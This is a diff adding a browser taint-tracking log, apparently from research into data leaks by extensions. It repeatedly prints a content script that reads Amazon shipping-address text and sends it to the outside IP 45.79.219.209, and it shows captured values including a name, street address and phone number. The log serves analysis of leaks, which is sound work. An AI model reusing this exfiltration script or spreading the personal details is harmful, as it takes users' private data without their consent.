@@ -1,0 +1,171 @@
+>>> Taint source: (invoked from blink)
+0x10ff8a607881 <String[119]: ue"Erin Lee\n27 A ST SW\nJACKSONVILLE, AL 36265-2402\nUnited States\nPhone number: *+1 470 253 1212,\nAdd delivery instructions">
+** In function 0x22d0002e41a0 ``, source code:
+console.log("start content-script mv2");
+let tainted_str = document.getElementsByClassName("a-box-inner a-padding-none")[1]
+    .innerText;
+
+let taint_post = document.getElementById("glow-ingress-block").innerText;
+var port = chrome.runtime.connect({name: "knock"});
+
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://45.79.219.209", true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+
+    }
+}
+encoder = new TextEncoder();
+console.log(taint_post);
+xhr.send(encoder.encode(taint_post).buffer);
+
+
+port.postMessage({tstr: tainted_str + "_end"});
+console.log("taint_str="+tainted_str);
+console.log("taint_url="+document.location.href);
+
+
+port.onMessage.addListener(function(msg) {
+    console.log("back str"+msg.backstr);
+    chrome.storage.local.set({ key: msg.backstr }, function(){
+    console.log("key is set to: " + msg.backstr);
+    });
+});
+
+
+>>> END Taint source
+
+>>> Taint source: (invoked from blink)
+0x10ff8a6078e9 <String[29]: ue"Deliver to Amy\nAtlanta 30322\x200c">
+** In function 0x22d0002e41a0 ``, source code:
+console.log("start content-script mv2");
+let tainted_str = document.getElementsByClassName("a-box-inner a-padding-none")[1]
+    .innerText;
+
+let taint_post = document.getElementById("glow-ingress-block").innerText;
+var port = chrome.runtime.connect({name: "knock"});
+
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://45.79.219.209", true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+
+    }
+}
+encoder = new TextEncoder();
+console.log(taint_post);
+xhr.send(encoder.encode(taint_post).buffer);
+
+
+port.postMessage({tstr: tainted_str + "_end"});
+console.log("taint_str="+tainted_str);
+console.log("taint_url="+document.location.href);
+
+
+port.onMessage.addListener(function(msg) {
+    console.log("back str"+msg.backstr);
+    chrome.storage.local.set({ key: msg.backstr }, function(){
+    console.log("key is set to: " + msg.backstr);
+    });
+});
+
+
+>>> END Taint source
+
+>>> Taint source: (invoked from blink)
+0x0e07fbfc6dc9 <ArrayBuffer map = 0x1774c89f6439>
+** In function 0x22d0002e41e8 ``, source code:
+console.log("start content-script mv2");
+let tainted_str = document.getElementsByClassName("a-box-inner a-padding-none")[1]
+    .innerText;
+
+let taint_post = document.getElementById("glow-ingress-block").innerText;
+var port = chrome.runtime.connect({name: "knock"});
+
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://45.79.219.209", true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+
+    }
+}
+encoder = new TextEncoder();
+console.log(taint_post);
+xhr.send(encoder.encode(taint_post).buffer);
+
+
+port.postMessage({tstr: tainted_str + "_end"});
+console.log("taint_str="+tainted_str);
+console.log("taint_url="+document.location.href);
+
+
+port.onMessage.addListener(function(msg) {
+    console.log("back str"+msg.backstr);
+    chrome.storage.local.set({ key: msg.backstr }, function(){
+    console.log("key is set to: " + msg.backstr);
+    });
+});
+
+
+>>> END Taint source
+
+>>> Taint source: (invoked from blink)
+0x00ee658ee289 <String[34]: e"https://www.amazon.com/a/addresses">
+** In function 0x22d0002e4250 ``, source code:
+console.log("start content-script mv2");
+let tainted_str = document.getElementsByClassName("a-box-inner a-padding-none")[1]
+    .innerText;
+
+let taint_post = document.getElementById("glow-ingress-block").innerText;
+var port = chrome.runtime.connect({name: "knock"});
+
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://45.79.219.209", true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+
+    }
+}
+encoder = new TextEncoder();
+console.log(taint_post);
+xhr.send(encoder.encode(taint_post).buffer);
+
+
+port.postMessage({tstr: tainted_str + "_end"});
+console.log("taint_str="+tainted_str);
+console.log("taint_url="+document.location.href);
+
+
+port.onMessage.addListener(function(msg) {
+    console.log("back str"+msg.backstr);
+    chrome.storage.local.set({ key: msg.backstr }, function(){
+    console.log("key is set to: " + msg.backstr);
+    });
+});
+
+
+>>> END Taint source
+
+>>> Taint source: (invoked from event_emitter:(Fire))
+0x08c8ef46d8e9 <String[123]: u"Erin Lee\n27 A ST SW\nJACKSONVILLE, AL 36265-2402\nUnited States\nPhone number: *+1 470 253 1212,\nAdd delivery instructions_end">
+** In function 0x22d0002e4280 ``, source code:
+(msg) {
+        console.log(msg);
+        console.log("tstr="+msg.tstr);
+        encoder = new TextEncoder();
+        decoder = new TextDecoder();
+        port.postMessage({backstr: "start"+decoder.decode(encoder.encode(msg.tstr))});
+    }
+>>> END Taint source
+
+>>> Taint source: (invoked from event_emitter:(Fire))
+0x07a52a54b059 <String[128]: u"startErin Lee\n27 A ST SW\nJACKSONVILLE, AL 36265-2402\nUnited States\nPhone number: *+1 470 253 1212,\nAdd delivery instructions_end">
+** In function 0x22d0002e4280 ``, source code:
+(msg) {
+    console.log("back str"+msg.backstr);
+    chrome.storage.local.set({ key: msg.backstr }, function(){
+    console.log("key is set to: " + msg.backstr);
+    });
+}
+>>> END Taint source
+
